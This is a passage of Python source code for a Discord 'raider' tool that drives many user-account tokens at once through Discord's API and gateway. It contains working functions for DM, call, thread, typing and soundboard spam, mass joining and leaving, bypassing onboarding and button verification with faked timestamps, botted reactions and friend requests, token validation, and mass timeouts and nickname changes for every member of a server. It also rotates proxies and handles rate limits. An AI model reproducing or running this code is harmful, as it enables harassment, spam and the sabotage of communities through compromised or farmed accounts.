                        time.sleep(random.uniform(10, 20))
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message", "Unknown error"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

            args = [(token,) for token in tokens]
            Menu().run(join_server, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get invite info", e)
            input()
            Menu().main_menu()

    def leaver(self, token, guild):
        try:
            def get_guild_name(guild):
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild}",
                    headers=self.headers(token)
                )
                if response.status_code == 200:
                    try:
                        return response.json()["name"]
                    except:
                        return guild

            self.guild = get_guild_name(guild)

            payload = {
                "lurking": False,
            }

            response = session.delete(
                f"https://discord.com/api/v9/users/@me/guilds/{guild}",
                json=payload,
                headers=self.headers(token)
            )

            if response.status_code == 204:
                console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
            elif response.status_code == 429:
                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def voice_spammer(self, token, ws, guild_id, channel_id, close=None):
        try:
            self.onliner_legacy(token, ws)
            ws.send(
                json.dumps(
                    {
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": False,
                            "self_deaf": False,
                            "self_stream": False,
                            "self_video": True,
                        },
                    }
                )
            )
            ws.send(
                json.dumps(
                    {
                        "op": 18,
                        "d": {
                            "type": "guild",
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "preferred_region": "singapore",
                        },
                    }
                )
            )
            ws.send(json.dumps({"op": 1, "d": None}))
            if close:
                ws.close()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def vc_joiner(self, token, guild, channel, ws):
        try:
            for _ in range(1):
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {
                            "os": "windows",
                            "browser": "Discord",
                            "device": "desktop"
                        }
                    }
                }))
                ws.send(json.dumps({
                    "op": 4,
                    "d": {
                        "guild_id": guild,
                        "channel_id": channel,
                        "self_mute": random.choice([True, False]),
                        "self_deaf": False
                    }
                }))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onliner_legacy(self, token, ws):
        try:
            ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": token,
                            "properties": {
                                "os": "Windows",
                            },
                            "presence": {
                                "game": {
                                    "name": "Cwelium",
                                    "type": 0,
                                },
                                "status": random.choice(['online', 'dnd', 'idle']),
                                "since": 0,
                                "afk": False
                            }
                        },
                    }
                )
            )
            console.log("Onlined", C[color], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def join_voice_channel(self, token, guild_id, channel_id):
        ws = websocket.WebSocket()
        def check_for_guild(token):
            response = session.get(
                f"https://discord.com/api/v9/guilds/{guild_id}",
                headers=self.headers(token)
            )
            return response.status_code == 200
        def check_for_channel(token):
            if check_for_guild(token):
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}",
                    headers=self.headers(token)
                )
                return response.status_code == 200
            return False
        if check_for_channel(token):
            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            self.vc_joiner(token, guild_id, channel_id, ws)
        else:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")

    def soundbord(self, token, channel):
        try:
            sounds = session.get(
                "https://discord.com/api/v9/soundboard-default-sounds",
                headers=self.headers(token)
            ).json()
            time.sleep(1)
            while True:
                sound = random.choice(sounds)
                payload = {
                    "emoji_id": None,
                    "emoji_name": sound["emoji_name"],
                    "sound_id": sound["sound_id"],
                }
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound",
                    headers=self.headers(token),
                    json=payload,
                )
                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"]
                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                    time.sleep(float(retry_after))
                else:
                    break
                time.sleep(random.uniform(0.56, 0.75))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def open_dm(self, token, user_id):
        try:
            payload = {"recipients": [f'{user_id}']}
            response = session.post(
                "https://discord.com/api/v9/users/@me/channels",
                headers=self.headers(token),
                json=payload
            )
            if response.status_code == 200:
                return response.json()["id"]
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                return
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def call_spammer(self, token, user_id):
        try:
            while True:
                channel_id = self.open_dm(token, user_id)
                json_data = {'recipients': None}
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/call",
                    headers=self.headers(token),
                    json=json_data,
                )
                if response.status_code == 200:
                    console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                    ws = websocket.WebSocket()
                    self.voice_spammer(token, ws, channel_id, channel_id, True)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    return
                time.sleep(5)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def dm_spammer(self, token, user_id, message):
        try:
            channel_id = self.open_dm(token, user_id)
            while True:
                payload = {"content": message, "nonce": str(self.nonce())}
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    json=payload
                )
                if response.status_code == 200:
                    console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    break
                time.sleep(7)
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def format_tokens(self):
        try:
            formatted = []
            for token in tokens:
                token = token.strip()
                if token:
                    tokens_split = token.split(":")
                    if len(tokens_split) >= 3:
                        formatted_token = tokens_split[2]
                        formatted.append(formatted_token)
                    else:
                        formatted.append(token)
            console.log("Success", C["green"], f"Formatted {len(formatted)} tokens")
            with open("data/tokens.txt", "w") as f:
                for token in formatted:
                    f.write(f"{token}\n")
            Menu().main_menu()
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def bio_changer(self, token, bio):
        try:
            payload = {"bio": bio}
            response = session.patch(
                "https://discord.com/api/v9/users/@me/profile",
                headers=self.headers(token),
                json=payload
            )
            if response.status_code == 200:
                console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
            elif response.status_code == 429:
                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {"nick": nick}
            response = session.patch(
                f"https://discord.com/api/v9/guilds/{guild}/members/@me",
                headers=self.headers(token),
                json=payload
            )
            if response.status_code == 200:
                console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload
                )
                if response.status_code == 201:
                    console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                elif response.status_code == 429:
                    retry_after = response.json()["retry_after"]
                    if int(retry_after) > 10:
                        console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                        break
                    else:
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channel_id):
        try:
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/typing",
                    headers=self.headers(token)
                )
                if response.status_code == 204:
                    console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    time.sleep(9)
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {"username": nickname, "discriminator": None}
            response = session.post(
                f"https://discord.com/api/v9/users/@me/relationships",
                headers=self.headers(token),
                json=payload
            )
            if response.status_code == 204:
                console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            elif response.status_code == 400:
                console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            else:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def guild_checker(self, guild_id):
        def main_checker(token):
            try:
                while True:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token)
                    )
                    if response.status_code == 200:
                        console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
                    elif response.status_code == 429:
                        retry_after = response.json()["retry_after"]
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    else:
                        console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                        break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
        args = [(token,) for token in tokens]
        Menu().run(main_checker, args)

    def token_checker(self):
        valid = []
        def main(token):
            try:
                while True:
                    response = session.get(
                        "https://discordapp.com/api/v9/users/@me/library",
                        headers=self.headers(token)
                    )
                    if response.status_code == 200:
                        console.log("Valid", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        valid.append(token)
                        break
                    elif response.status_code == 403:
                        console.log("Locked", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
                    elif response.status_code == 429:
                        retry_after = response.json()["retry_after"]
                        console.log("Ratelimit", C["pink"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{retry_after}s")
                        time.sleep(retry_after)
                    else:
                        console.log("Invalid", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
        with open("data/tokens.txt", "r") as f:
            tokens = list({line.strip().replace('"', '') for line in f if line.strip()})
        args = [(token,) for token in tokens]
        Menu().run(main, args)
        with open("data/tokens.txt", "w") as f:
            f.write("\n".join(valid))

    def accept_rules(self, guild_id):
        try:
            valid = []
            for token in tokens:
                value = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token)
                )
                if value.status_code == 200:
                    valid.append(token)
                    payload = value.json()
                    break
            if not valid:
                console.log("Failed", C["red"], "All tokens are Invalid")
                input()
                Menu().main_menu()
                return
            def run_main(token):
                try:
                    response = session.put(
                        f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                        headers=self.headers(token),
                        json=payload
                    )
                    if response.status_code == 201:
                        console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
            args = [(token,) for token in tokens]
            Menu().run(run_main, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Accept Rules", e)

    def onboard_bypass(self, guild_id):
        try:
            master_token = None
            for token in tokens:
                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/onboarding", headers=self.headers(token))
                if resp.status_code == 200:
                    onboarding_data = resp.json()
                    master_token = token
                    break
            if not master_token:
                console.log("Failed", C["red"], "No tokens have access to this guild's onboarding.")
                return
            responses = []
            prompts_seen = {}
            options_seen = {}
            prompts = onboarding_data.get("prompts", [])
            if not prompts:
                console.log("Info", C["gray"], "Guild has no onboarding prompts.")
                return
            for prompt in prompts:
                p_id = prompt["id"]
                available_options = prompt.get("options", [])
                if not available_options: continue
                selected_option = random.choice(available_options)["id"]
                responses.append(selected_option)
                fake_time = int(time.time()) - random.randint(5, 15)
                prompts_seen[p_id] = fake_time
                for opt in available_options:
                    options_seen[opt["id"]] = fake_time
            def run_task(token):
                token_time = int(time.time()) - random.randint(1, 10)
                t_prompts_seen = {k: token_time for k in prompts_seen}
                t_options_seen = {k: token_time for k in options_seen}
                payload = {
                    "onboarding_responses": responses,
                    "onboarding_prompts_seen": t_prompts_seen,
                    "onboarding_responses_seen": t_options_seen,
                }
                resp = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=payload
                )
                if resp.status_code == 200:
                    console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                else:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
            args = [(token,) for token in tokens]
            Menu().run(run_task, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

    def reactor_main(self, channel_id, message_id):
        try:
            access_token = []
            emojis = []
            params = {"around": message_id, "limit": 50}
            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )
                if response.status_code == 200:
                    access_token.append(token)
                    break
            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
                return
            data = response.json()
            for msg in data:
                if msg["id"] == message_id:
                    reactions = msg.get("reactions", [])
                    for emois in reactions:
                        if emois:
                            emoji_id = emois["emoji"]["id"]
                            emoji_name = emois["emoji"]["name"]
                            if emoji_id is None:
                                emojis.append(emoji_name)
                            else:
                                emojis.append(f"{emoji_name}:{emoji_id}")
                    break
            if not emojis:
                console.log("Failed", C["red"], "No reactions Found in this message")
                input()
                Menu().main_menu()
                return
            for i, emoji in enumerate(emojis, start=1):
                print(f"{C[color]}0{i}:{C['white']} {emoji}")
            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))
            selected = emojis[int(choice) - 1]
            def add_reaction(token):
                try:
                    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"
                    response = session.put(url, headers=self.headers(token))
                    if response.status_code == 204:
                        console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
            args = [(token,) for token in tokens]
            Menu().run(add_reaction, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get emojis", e)
            input()
            Menu().main_menu()

    def button_bypass(self, channel_id, message_id, guild_id):
        try:
            access_token = []
            buttons = []
            params = {"around": message_id, "limit": 50}
            for token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
                    headers=self.headers(token),
                    params=params
                )
                if response.status_code == 200:
                    access_token.append(token)
                    break
            if not access_token:
                console.log("Failed", C["red"], "Missing Permissions")
                input()
                Menu().main_menu()
                return
            message = next((m for m in response.json() if m["id"] == message_id), None)
            if not message:
                console.log("Failed", C["red"], "Message not found")
                input()
                Menu().main_menu()
                return
            for row in message.get("components", []):
                for comp in row.get("components", []):
                    if comp.get("type") == 2:
                        label = comp.get("label", "No Label")
                        custom_id = comp["custom_id"]
                        buttons.append({"label": label, "custom_id": custom_id})
            if not buttons:
                console.log("Failed", C["red"], "No buttons found in this message")
                input()
                Menu().main_menu()
                return
            for i, btn in enumerate(buttons, start=1):
                print(f"{C[color]}0{i}:{C['white']} {btn['label']}")
            choice = input(f"\n{console.prompt('Choice')}")
            if choice.startswith('0') and len(choice) == 2:
                choice = str(int(choice))
            btn = buttons[int(choice) - 1]
            custom_id = btn["custom_id"]
            def click_button(token):
                try:
                    payload = {
                        "application_id": message["author"]["id"],
                        "channel_id": channel_id,
                        "data": {
                            "component_type": 2,
                            "custom_id": custom_id,
                        },
                        "guild_id": guild_id,
                        "message_flags": 0,
                        "message_id": message_id,
                        "nonce": str(self.nonce()),
                        "session_id": uuid.uuid4().hex,
                        "type": 3,
                    }
                    resp = session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=self.headers(token),
                        json=payload
                    )
                    if resp.status_code == 204:
                        console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                except Exception as e:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
            args = [(token,) for token in tokens]
            Menu().run(click_button, args)
        except Exception as e:
            console.log("Failed", C["red"], "Failed to get buttons", e)
            input()
            Menu().main_menu()

    # ========== ステータス消去（06） ==========
    def clear_activity(self):
        for token in tokens:
            try:
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {"os": "Windows", "browser": "Discord"},
                        "presence": {
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": False
                        }
                    }
                }))
                ws.close()
                session.patch(
                    "https://discord.com/api/v9/users/@me/settings",
                    headers=self.headers(token),
                    json={"custom_status": None}
                )
                console.log("Cleared", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
            except Exception as e:
                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
            time.sleep(0.5)

    # ========== オンライン維持（WebSocket方式） ==========
    def keep_online(self, token):
        while True:
            try:
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({
                    "op": 2,
                    "d": {
                        "token": token,
                        "properties": {"os": "Windows", "browser": "Discord"},
                        "presence": {
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": False
                        }
                    }
                }))
                console.log("Online", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                while True:
                    time.sleep(30)
                    ws.send(json.dumps({"op": 1, "d": None}))
            except Exception as e:
                console.log("Reconnecting", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", str(e))
                time.sleep(5)

    # ========== タイムアウト機能（26） ==========
    def mass_timeout(self, token, guild_id, days=28):
        try:
            members = []
            after = None
            while True:
                params = {"limit": 1000}
                if after:
                    params["after"] = after
                resp = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/members",
                    headers=self.headers(token),
                    params=params
                )
                if resp.status_code != 200:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"メンバー取得失敗 ({resp.status_code})")
                    return
                data = resp.json()
                if not data:
                    break
                members.extend(data)
                after = data[-1]["user"]["id"]
                if len(data) < 1000:
                    break

            if not members:
                console.log("Info", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "メンバーがいません")
                return

            console.log("Info", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{len(members)}人のメンバーをタイムアウトします (最大{days}日)")

            timeout_until = (datetime.now() + timedelta(days=days)).isoformat()

            def timeout_member(member):
                user_id = member["user"]["id"]
                try:
                    r = session.patch(
                        f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
                        headers=self.headers(token),
                        json={"communication_disabled_until": timeout_until}
                    )
                    if r.status_code == 200:
                        console.log("Timeout", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']}")
                    elif r.status_code == 429:
                        retry_after = r.json().get("retry_after", 5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {retry_after:.2f}s")
                        time.sleep(retry_after)
                        r2 = session.patch(
                            f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
                            headers=self.headers(token),
                            json={"communication_disabled_until": timeout_until}
                        )
                        if r2.status_code == 200:
                            console.log("Timeout", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} (retry)")
                        else:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} ({r2.status_code})")
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} ({r.status_code})")
                except Exception as e:
                    console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']}: {e}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(timeout_member, members)

            console.log("Done", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{len(members)}人のタイムアウト処理完了")
        except Exception as e:
            console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    # ========== ニックネーム一括変更（27） ==========
    def mass_nick_all(self, token, guild_id, new_nick):
        try:
            members = []
            after = None
            while True:
                params = {"limit": 1000}
                if after:
                    params["after"] = after
                resp = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/members",
                    headers=self.headers(token),
                    params=params
                )
                if resp.status_code != 200:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"メンバー取得失敗 ({resp.status_code})")
                    return
                data = resp.json()
                if not data:
                    break
                members.extend(data)
                after = data[-1]["user"]["id"]
                if len(data) < 1000:
                    break

            if not members:
                console.log("Info", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "メンバーがいません")
                return

            console.log("Info", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{len(members)}人のニックネームを '{new_nick}' に変更します")

            def change_nick(member):
                user_id = member["user"]["id"]
                try:
                    r = session.patch(
                        f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
                        headers=self.headers(token),
                        json={"nick": new_nick}
                    )
                    if r.status_code == 200:
                        console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} -> {new_nick}")
                    elif r.status_code == 429:
                        retry_after = r.json().get("retry_after", 5)
                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {retry_after:.2f}s")
                        time.sleep(retry_after)
                        r2 = session.patch(
                            f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
                            headers=self.headers(token),
                            json={"nick": new_nick}
                        )
                        if r2.status_code == 200:
                            console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} -> {new_nick} (retry)")
                        else:
                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} ({r2.status_code})")
                    else:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} ({r.status_code})")
                except Exception as e:
                    console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']}: {e}")

            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(change_nick, members)

            console.log("Done", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{len(members)}人のニックネーム変更完了")
        except Exception as e:
            console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)


# ============================================================================
#  Menu クラス（一部メソッドを改良版に対応）
# ============================================================================
class Menu:
    def __init__(self):
        global global_raider
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]

        if global_raider is None:
            self.raider = Raider()
            global_raider = self.raider
        else:
            self.raider = global_raider

        self.bot_controller = None
        self.bot_config = load_bot_config()

        self.options = {
            "1": self.joiner,
            "2": self.leaver,
            "3": self.spammer,
            "4": self.checker,
            "5": self.reactor,
            "6": self.clear_status,
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "25": self.poll_spammer,
            "26": self.mass_timeout,
            "27": self.mass_nick_all,
            "29": self.external_bot_setup,
            "30": self.external_bot_spam,
            "31": self.external_bot_status,
            "h": self.show_help,
            "H": self.show_help,
            "~": self.credit,
        }

    def main_menu(self):
        console.run()
        choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")
        if choice.startswith('0') and len(choice) == 2:
            choice = str(int(choice))
        if choice.lower() in self.options:
            console.render_ascii()
            self.options[choice.lower()]()
        else:
            self.main_menu()

    # ================== 通常の run（他の機能用） ==================
    def run(self, func, args):
        threads = []
        console.clear()
        console.render_ascii()
        for idx, arg in enumerate(args):
            if proxy and proxies:
                selected_proxy = proxies[idx % len(proxies)]
                # スレッドローカルセッションにプロキシを設定するために、
                # 関数内で get_session() が呼ばれたときに設定される。
                # ここでは何もしない（各スレッドの get_session() でランダムに選ばれる）
            thread = threading.Thread(target=func, args=arg, daemon=True)
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    # ================== スパマー専用 run（SHOULD_STOP制御） ==================
    def run_spammer(self, func, args):
        global SHOULD_STOP
        SHOULD_STOP = False

        console.clear()
        console.render_ascii()

        if not args:
            console.log("Error", C["red"], False, "実行するスレッドがありません。")
            input("Press Enter to continue...")
            self.main_menu()
            return

        # 終了監視スレッド
